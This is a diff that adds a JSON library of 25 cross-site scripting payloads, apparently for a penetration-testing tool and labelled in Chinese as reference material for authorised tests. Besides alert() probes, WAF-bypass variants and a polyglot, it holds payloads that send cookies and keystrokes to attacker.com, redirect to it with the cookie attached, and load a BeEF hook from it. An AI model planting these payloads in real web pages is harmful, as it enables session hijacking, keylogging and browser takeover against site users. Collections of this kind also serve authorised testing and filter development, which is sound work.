@@ -1,0 +1,217 @@
+{
+  "category": "Cross-Site Scripting (XSS)",
+  "version": "2.0",
+  "description": "XSS 测试 payload 库（参考示例）",
+  "note": "⚠️ 参考说明：本 payload 库仅供参考，实际测试应根据目标防护机制、上下文等动态选择和构造 payload",
+  "payloads": [
+    {
+      "id": "xss-001",
+      "name": "Basic Script Tag",
+      "payload": "<script>alert(1)</script>",
+      "type": "reflected",
+      "detection_pattern": ["alert", "script"],
+      "browser_test": true
+    },
+    {
+      "id": "xss-002",
+      "name": "Image OnError",
+      "payload": "<img src=x onerror=alert(1)>",
+      "type": "reflected",
+      "detection_pattern": ["onerror", "img"],
+      "waf_bypass": ["<img src=x onerror=alert(1)>", "<IMG SRC=x ONERROR=alert(1)>"]
+    },
+    {
+      "id": "xss-003",
+      "name": "SVG OnLoad",
+      "payload": "<svg onload=alert(1)>",
+      "type": "reflected",
+      "detection_pattern": ["svg", "onload"],
+      "waf_bypass": ["<SVG ONLOAD=alert(1)>", "<svg/onload=alert(1)>"]
+    },
+    {
+      "id": "xss-004",
+      "name": "Body OnLoad",
+      "payload": "<body onload=alert(1)>",
+      "type": "reflected",
+      "detection_pattern": ["body", "onload"]
+    },
+    {
+      "id": "xss-005",
+      "name": "IFrame JavaScript",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "type": "reflected",
+      "detection_pattern": ["iframe", "javascript"]
+    },
+    {
+      "id": "xss-006",
+      "name": "Input OnFocus",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "type": "reflected",
+      "detection_pattern": ["input", "onfocus"],
+      "user_interaction": true
+    },
+    {
+      "id": "xss-007",
+      "name": "Marquee OnStart",
+      "payload": "<marquee onstart=alert(1)>",
+      "type": "reflected",
+      "detection_pattern": ["marquee", "onstart"]
+    },
+    {
+      "id": "xss-008",
+      "name": "Video OnError",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "type": "reflected",
+      "detection_pattern": ["video", "source", "onerror"]
+    },
+    {
+      "id": "xss-009",
+      "name": "Audio OnError",
+      "payload": "<audio onerror=alert(1)>",
+      "type": "reflected",
+      "detection_pattern": ["audio", "onerror"]
+    },
+    {
+      "id": "xss-010",
+      "name": "Details OnToggle",
+      "payload": "<details ontoggle=alert(1) open>",
+      "type": "reflected",
+      "detection_pattern": ["details", "ontoggle"],
+      "user_interaction": true
+    },
+    {
+      "id": "xss-011",
+      "name": "Storage XSS - Cookie Steal",
+      "payload": "<script>new Image().src=\"http://attacker.com/steal?c=\"+document.cookie;</script>",
+      "type": "stored",
+      "detection_pattern": ["cookie", "image"],
+      "malicious": true,
+      "usage": "Cookie 窃取测试（仅授权测试）"
+    },
+    {
+      "id": "xss-012",
+      "name": "Storage XSS - KeyLogger",
+      "payload": "<script>document.onkeypress=function(e){new Image().src=\"http://attacker.com/log?k=\"+e.key;}</script>",
+      "type": "stored",
+      "detection_pattern": ["onkeypress", "key"],
+      "malicious": true,
+      "usage": "键盘记录测试（仅授权测试）"
+    },
+    {
+      "id": "xss-013",
+      "name": "DOM XSS - location.href",
+      "payload": "<script>location.href=\"http://attacker.com/?c=\"+document.cookie;</script>",
+      "type": "dom",
+      "detection_pattern": ["location", "href"],
+      "sink": "location.href"
+    },
+    {
+      "id": "xss-014",
+      "name": "DOM XSS - innerHTML",
+      "payload": "<script>document.body.innerHTML=\"<img src=x onerror=alert(1)>\";</script>",
+      "type": "dom",
+      "detection_pattern": ["innerHTML"],
+      "sink": "document.body.innerHTML"
+    },
+    {
+      "id": "xss-015",
+      "name": "DOM XSS - eval",
+      "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "type": "dom",
+      "detection_pattern": ["eval", "atob"],
+      "sink": "eval",
+      "encoding": "base64"
+    },
+    {
+      "id": "xss-016",
+      "name": "WAF Bypass - Case Variation",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "type": "waf_bypass",
+      "technique": "case_variation",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-017",
+      "name": "WAF Bypass - Null Byte",
+      "payload": "<script\\x00>alert(1)</script>",
+      "type": "waf_bypass",
+      "technique": "null_byte",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-018",
+      "name": "WAF Bypass - Newline",
+      "payload": "<script\\n>alert(1)</script>",
+      "type": "waf_bypass",
+      "technique": "newline",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-019",
+      "name": "WAF Bypass - Tab",
+      "payload": "<script\\t>alert(1)</script>",
+      "type": "waf_bypass",
+      "technique": "tab",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-020",
+      "name": "WAF Bypass - Double Encode",
+      "payload": "%253Cscript%253Ealert(1)%253C/script%253E",
+      "type": "waf_bypass",
+      "technique": "double_encode",
+      "encoding": "url",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-021",
+      "name": "WAF Bypass - Unicode",
+      "payload": "<\\u0073cript>alert(1)</script>",
+      "type": "waf_bypass",
+      "technique": "unicode",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-022",
+      "name": "WAF Bypass - Backtick",
+      "payload": "<img src=x onerror=`alert(1)`>",
+      "type": "waf_bypass",
+      "technique": "backtick",
+      "original": "<img src=x onerror=alert(1)>"
+    },
+    {
+      "id": "xss-023",
+      "name": "WAF Bypass - Expression (IE)",
+      "payload": "<div style=\"width:expression(alert(1))\">",
+      "type": "waf_bypass",
+      "technique": "expression",
+      "browser": "IE",
+      "original": "<script>alert(1)</script>"
+    },
+    {
+      "id": "xss-024",
+      "name": "BeEF Hook",
+      "payload": "<script src=\"http://attacker.com:3000/hook.js\"></script>",
+      "type": "hook",
+      "detection_pattern": ["hook.js", "beef"],
+      "malicious": true,
+      "usage": "BeEF 框架钩子（仅授权测试）"
+    },
+    {
+      "id": "xss-025",
+      "name": "Polyglot XSS",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "type": "polyglot",
+      "detection_pattern": ["alert", "svg", "onclick"],
+      "waf_bypass": true,
+      "usage": "多上下文 XSS payload"
+    }
+  ],
+  "metadata": {
+    "total_payloads": 25,
+    "types": ["reflected", "stored", "dom", "waf_bypass", "hook", "polyglot"],
+    "sinks": ["innerHTML", "eval", "location.href", "document.write", "setTimeout"],
+    "browsers": ["Chrome", "Firefox", "Safari", "IE", "Edge"],
+    "last_updated": "2026-03-30"
+  }
+}
